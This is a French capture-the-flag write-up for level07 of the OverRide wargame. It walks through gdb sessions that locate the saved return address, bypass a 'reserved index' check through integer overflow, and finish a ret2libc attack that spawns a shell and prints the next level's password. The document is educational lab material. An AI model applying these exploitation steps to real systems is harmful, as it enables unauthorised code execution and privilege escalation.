# Override
Override 42 security level07

```
Input command: ^C
level07@OverRide:~$
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 13
 Completed store command successfully
Input command: read
 Index: 13
 Number at data[13] is 42
 Completed read command successfully
Input command: 42
 Failed to do 42 command
Input command: store
 Number: 42
 Index: -123
 Completed store command successfully
Input command: read
 Index: -123
 Number at data[4294967173] is 42
 Completed read command successfully
Input command: store
 Number: 23
 Index: 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

On remarque ici plusieurs choses, on a un executable qui nous permet de stocker des chiffres et de les afficher.
Les nombres negatifs bouclent sur l'int maximum.
Enfin les nombres divisible par 3 (n % 3 == 0) ne sont pas accessible.
Traduisons le code afin d'y voir plus clair.
On remarque 2 choses dès le debut, les arguments ainsi que l'environement sont nettoyés dès le début de l'execution.
On pense donc a oublier cette piste.
Essayons de trouver une EIP afin de potentiellement pouvoir faire une attaque ret2libc.

```
(gdb) info frame
Stack level 0, frame at 0xffffd2b0:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd2b0
 Saved registers:
  eip at 0xffffd2ac
```

Nous avons donc maintenant l'adresse de retour où nous voudrons injecter notre code au lieu de return.
# https://stackoverflow.com/questions/32345320/get-return-address-gdb/32361982

Maintenant trouvons l'adresse du tableau:

```
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) disass
# On observe
0x080486ff <+40>:	add    0x8(%ebp),%eax
# Trouvons plus d'informations sur cette espace memoire 
(gdb) x/x $ebp+0x8
0xffffd0c0:	0xffffd0e4
# 0xffffd0c0. -> Adresse oû est stockée l'adresse du tableau
# 0xffffd0e4  -> Adresse du tableau
```

Calculons donc maintenant : 0xffffd0c0 - 0xffffd0e4 = -36.
Il s'agit d'un tableau d'int donc -36/4 = -9.

Verifions nos calculs:

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
 Index: -9
 Number at data[4294967287] is 4294955268
 Completed read command successfully
```
4294955236 est bien égal à 0xffffd0e4

On va donc calculer l'offset:
0xffffd2ac - 0xffffd0e4
456.
On continue de diviser par 4
456 / 4 = 114
On a donc un offset de 114.
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read
 Index: 114
 Number at data[114] is 4158936339
 Completed read command successfully
4158936339 == 0xf7e45513
On se souvient
eip = 0x8048723 in main; saved eip 0xf7e45513
```
Preparons notre attque ret2libc en allant chercher l'adresse du system.
```
gdb ./level07
(gdb) b * main
Breakpoint 1 at 0x8048723
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048723 in main ()
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb)
```
On a donc l'adresse du system : 0xf7e6aed0
On se souvient que les nombres divisibles par 3 sont bloqués directement.
Comme fait precedemment, on va non pas underflow mais overflow cette fois ci.
Calculons donc un nombre qui overflow en int pour donner 114:
Formule : UINT_MAX/4 + n
-> 1073741938
On a de la chance ce n'est pas divisible par 3.
```
Input command: store
 Number: 4321
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 4321
 Completed read command successfully
```

Comme precedemment, allons chercher l'adresse d'exit pour notre attaque car il nous faut une adresse de retour.
```
(gdb) b * main
Breakpoint 1 at 0x8048723
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048723 in main ()
(gdb) info proc map
process 1995
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0
	0xf7fda000 0xf7fdb000     0x1000        0x0
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb)
```
On l'a : 0xf7f897ec

Donc :
```
0xf7e6aed0  system -> 4159090384
eip -> 1073741938
0xf7f897ec /bin/sh -> 4160264172
Index suivant -> 116 (EIP + 2 pour la ret2libc)
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
